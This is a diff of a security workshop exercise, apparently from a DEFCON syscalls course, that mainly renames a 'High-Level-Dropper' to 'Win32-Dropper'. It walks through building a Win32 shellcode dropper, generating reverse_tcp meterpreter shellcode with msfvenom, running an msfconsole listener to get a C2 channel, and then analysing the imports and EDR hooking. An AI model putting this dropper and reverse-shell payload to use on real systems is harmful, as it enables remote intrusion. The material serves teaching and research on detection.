@@ -1,24 +1,22 @@
 ## Exercise 2: Win32 Dropper
-In **Exercise 2** we will create our first shellcode dropper based on **high level APIs** or **Win32 APIs**. This dropper will more or less be the reference for further development into a direct syscall and indirect syscall dropper. Later in this text we call the Dropper High-Level-Dropper. If you look at the figure below, you will see that we do not use direct or indirect syscalls at all. Instead we use the normal legitimate way like ``malware.exe -> Win32 APIs (kernel32.dll) -> Native APIs (ntdll.dll) -> syscall``.  
+In **Exercise 2** we will create our first shellcode dropper based on **high level APIs** or **Win32 APIs**. This dropper will more or less be the reference for further development into a direct syscall and indirect syscall dropper. Later in this text we call the Dropper Win32-Dropper. If you look at the figure below, you will see that we do not use direct or indirect syscalls at all. Instead we use the normal legitimate way like ``malware.exe -> Win32 APIs (kernel32.dll) -> Native APIs (ntdll.dll) -> syscall``.  
 ![_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235367776-54229a66-f1d6-4b8e-a2a2-7bb81fecbf48.png)
 
 
 ## Exercise 2 tasks:
-### Creating the Win32 Dropper
-1. Download the Win32 dropper POC from the Code section of this chapter.
+1. Download the Win32-Dropper POC from the Code section of this chapter.
 2. In this case the code is already implemented in the POC. Your first task is to create x64 meterpreter shellcode and copy it into the POC.  
 3. Compile the POC as a x64 release. 
 4. Create and run a staged x64 meterpreter listener using msfconsole.
 5. Run your compiled .exe and check that a stable command and control channel opens. 
-### Analysing the Direct Syscall Dropper
-6. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
-7. Use **x64dbg** to debug or analyse the dropper. 
+6. Use the Visual Studio **dumpbin** tool to analyse the Win32-Dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
+7. Use **x64dbg** to debug or analyse the Win32-Dropper. 
      - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
      - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?
 
 
 ## Visual Studio
-You can download the POC from the code section of this chapter. The technical functionality of the High-Level-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the High-Level-Dropper or Win32-Dropper into a Low-Level-Dropper using direct system calls. In the Win32 dropper we use the following Win32 APIs 
+You can download the POC from the code section of this chapter. The technical functionality of the Win32-Dropper is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the Win32-Dropper into a Low-Level-Dropper using direct system calls. In the Win32-Dropper we use the following Win32 APIs 
 - VirtualAlloc
 - WriteProcessMemory
 - CreateThread
@@ -148,7 +146,7 @@ int main() {
 
     
 ## Meterpreter Shellcode
-In this step, we will create our meterpreter shellcode for the High-Level-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+In this step, we will create our meterpreter shellcode for the Win32-Dropper poc with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
 <details>
     
 **kali>**       
@@ -159,7 +157,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
     
-The shellcode can then be copied into the High-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
+The shellcode can then be copied into the Win32-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
 <p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
@@ -167,7 +165,7 @@ The shellcode can then be copied into the High-Level-Dropper poc by replacing th
     
 
 ## MSF-Listener
-Before we test the functionality of our High-Level-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our Win32-Dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -198,7 +196,7 @@ Once the listener has been successfully started, you can run your compiled high_
 </details>
 
 
-## High-Level-Dropper analysis: dumpbin
+## Win32-Dropper analysis: dumpbin
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>
     
@@ -211,16 +209,16 @@ dumpbin /imports high_level.exe
     
 <details>
     <summary>Solution</summary>   
-In the case of the High-Level-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the High-Level-Dropper from the kernel32.dll.
+In the case of the Win32-Dropper, you should see that the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are correctly imported into the Win32-Dropper from the kernel32.dll.
 <p align="center">
 <img width="693" alt="image" src="https://user-images.githubusercontent.com/50073731/235369396-dbad1178-e9a2-4c55-8c6a-fdc9362d864c.png">
 </p>
 </details>
 
     
-## Win32 Dropper analysis: x64dbg
-The first step is to run your win32 dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
-Then we open x64dbg and attach to the running process, note that if you open the win32 dropper directly in x64dbg you need to run the assembly first.
+## Win32-Dropper analysis: x64dbg
+The first step is to run your Win32-Dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
+Then we open x64dbg and attach to the running process, note that if you open the Win32-Dropper directly in x64dbg you need to run the assembly first.
 <details>
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
@@ -232,11 +230,11 @@ Then we open x64dbg and attach to the running process, note that if you open the
 
 
 First we want to check which APIs (Win32 or Native) or if the correct APIs are being imported and from which module or memory location. 
-Remember that no direct syscalls or similar are used in the Win32 dropper. What results do you expect?
+Remember that no direct syscalls or similar are used in the Win32-Dropper. What results do you expect?
      
 <details>
     <summary>Solution</summary>
-Checking the imported symbols in our Win32 dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
+Checking the imported symbols in our Win32-Dropper, we should see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are imported from kernel32.dll. So the result is the same as with dumpbin and seems to be valid.     
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83">   
 <img width="800" alt="image" src="[https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/93836da7-aaf0-412d-8871-6cea88b00d83](https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/facd43e5-6cb6-44b7-b17b-0dfd8faab28a)">
@@ -273,11 +271,11 @@ We also want to check from which module or memory location the syscall stub of t
 
 
    
-## Summary: Win32 Dropper
+## Summary: Win32-Dropper
 - No direct system calls at all
-- Syscall execution over normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
-- Dropper imports VirtualAlloc from kernel32.dll...
-- ...then imports NtAllocateVirtualMemory from ntdll.dll...
-- ...and finally executes the corresponding syscall or syscall stub
-- If an EDR uses user mode hooking in kernel32.dll or ntdll.dll, the content of malware.exe is redirected to the EDR's hooking.dll.
+- Syscall execution via normal transition from high_level_dropper.exe -> kernel32.dll -> ntdll.dll -> syscall
+- Win32-Dropper imports Windows APIs from kernel32.dll...
+- ...then accesses or imports the native functions from ntdll.dll...
+- ...and finally executes the code of the corresponding native function, including the syscall instruction.  
+- If an EDR uses user mode hooking in kernel32.dll or ntdll.dll, the contents of malware.exe are redirected to the EDR's hooking.dll.
 
